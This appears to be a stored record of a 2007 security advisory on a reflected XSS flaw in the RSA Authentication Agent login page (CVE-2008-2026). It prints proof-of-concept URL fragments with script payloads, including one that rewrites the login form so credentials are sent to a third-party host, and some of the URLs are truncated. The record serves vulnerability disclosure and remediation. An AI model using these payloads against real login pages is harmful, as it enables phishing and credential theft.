    "text": "vul_name : XSS on RSA Authentication Agent login page ， vul_cve : CVE-2008-2026 ， vul_poc : -BEGIN PGP SIGNED MESSAGE- ， Hash : SHA1 ， PR07-44 : XSS on RSA Authentication Agent login page ， Vulnerability found : 5th December 2007 ， Vendor informed : 13th December 2007 ， Severity : Medium-high ， Successfully tested on : RSA Authentication Agent 5.3.0.258 for Web for ， Internet Information Services ， Description :  ， RSA Authentication Agent is vulnerable to a vanilla XSS on the login page. ， Vulnerable server-side script : '/WebID/IISWebAgentIF.dll' ， Unfiltered parameter : 'postdata' ， Notes :  ， It is believed that this vulnerability was originally reported in 2005 ，  ( BID 13168 ) . However , In the original report , only version 5.2 of the ， Authentication Agent was mentioned to be vulnerable. Additionally ,  ， nothing was said regarding the possibility of exploiting this XSS as a ， GET request ( as opposed to POST ) . Therefore , the vulnerability can be ， exploited via a malicious URL , since visiting a URL results in the web ， browser submitting a GET request. Since the XSS condition occurs on the ， login page , the bug is highly suitable for advanced XSS phishing attacks ， as illustrated in the proof of concept below. Please note that this is ， issue is different from CAN-2003-0389 and CVE-2005-3329. ， Simple XSS Proof of Concept ( PoC ) URLs :  ， e&referrer=Z2F&sessionid=0&postdata=%22%3E%3Cscript%3Ealert ( %22XSS%22 ) %3 ， C/script%3E%3Ca%20b=%22&authntype=2&username=test&passcode=test ， e&referrer=Z2F&sessionid=0&postdata=%22%3E%3Cscript%3Ealert ( %22XSS%22 ) %3 ， C/script%3E%3Ca%20b=%22 ， The injected payload in the previous examples is :  ， \"><script>alert ( \"XSS\" ) </script><a b=\" ， The following specially-crafted URL performs an advanced XSS phishing ， attack. After the victim enters his/her username and passcode , the ， credentials are forwarded to a third-party site ( procheckup.com in this ， case ) and logged by the attacker :  ， e&referrer=Z2F&sessionid=0&postdata=%22%3E%3Cscript%3Edocument.forms [ 0 ] . ， action=%22 ， &username=anyvaluehere&passcode=anyvaluehere ， e&referrer=Z2F&sessionid=0&postdata=%22%3E%3Cscript%3Edocument.forms [ 0 ] . ， action=%22 ， The injected payload in the previous examples is :  ， \"><script>document.forms [ 0 ] .action=\" b=\" ， Consequences :  ， An attacker may be able to cause execution of malicious scripting code ， in the browser of a victim user who clicks on a link to a RSA ， Authentication Agent login page. Such code would run within the context ， of the target domain. ， This type of attack can result in non-persistent defacement of the ， target site , or the redirection of confidential information ( i.e. :  ， session IDs or passwords ) to unauthorised third parties. ， Fix :  ， The vendor has stated that this issue was addressed in the RSA ， Authentication Agent 5.3.3.378. RSA customers can download the upgrade ， from the RSA web site.",
